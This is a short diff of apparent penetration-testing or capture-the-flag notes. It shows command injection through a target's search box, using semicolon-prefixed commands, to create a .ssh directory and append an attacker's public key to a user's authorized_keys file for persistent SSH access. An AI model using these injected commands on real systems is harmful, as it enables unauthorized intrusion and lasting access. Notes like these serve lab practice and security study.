@@ -108,7 +108,8 @@ In order to Malicoius file upload we need
 To gain initial access with ssh RSA key:
   >ssh-keygen -t rsa -b 4096     to generate you own keys in an .ssh file
   >cat ~/.ssh/id_rsa.pub
-  on target >ls -la /home/billybob ##check if there is an .ssh file here, if not 
+  on target (the little stupid ahh search box i think its for posting)
+            >ls -la /home/billybob ##check if there is an .ssh file here, if not 
             >;mkdir /home/billybob/.ssh
             >;echo "your_public_key_here" >> /home/billybob/.ssh/authorized_keys
             >;cat /home/billybob/.ssh/authorized_keys ## to make sure it there 
